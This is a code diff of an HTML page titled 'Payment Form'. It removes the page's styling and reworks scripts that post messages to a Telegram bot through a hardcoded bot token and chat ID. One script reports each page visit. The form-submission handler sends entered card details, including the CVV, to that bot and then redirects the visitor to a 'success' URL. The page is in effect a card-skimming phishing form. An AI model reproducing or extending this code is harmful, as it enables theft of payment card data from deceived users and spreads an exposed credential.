@@ -5,59 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment Form</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .payment-form {
-            background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .payment-form h2 {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .form-group input {
-            width: 90%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        .submit-btn:hover {
-            background-color: #0056b3;
-        }
+        /* Your existing CSS styles */
     </style>
 </head>
 <body>
@@ -109,13 +57,14 @@
             }
         });
 
-        // Notify when a user accesses the page
-        async function notifyUserEntry() {
+        // Function to notify Telegram when the user enters the site
+        function notifyUserEntry() {
             const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
             const chatId = '7747778364';
-            const message = `A user has accessed the payment page at ${new Date().toLocaleString()}.`;
 
-            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            const message = 'A user has entered the website!';
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -125,7 +74,8 @@
             });
         }
 
-        notifyUserEntry();
+        // Call the function when the page is loaded
+        window.addEventListener('load', notifyUserEntry);
 
         // Handle form submission
         document.getElementById('paymentForm').addEventListener('submit', async (event) => {
@@ -156,9 +106,8 @@ CVV: ${data.cvv}`;
                     text: message,
                 }),
             });
-        });
 
-       // Redirect the user to another page
+            // Redirect the user to another page
             window.location.href = 'https://example.com/success'; // Replace with your desired URL
         });
 
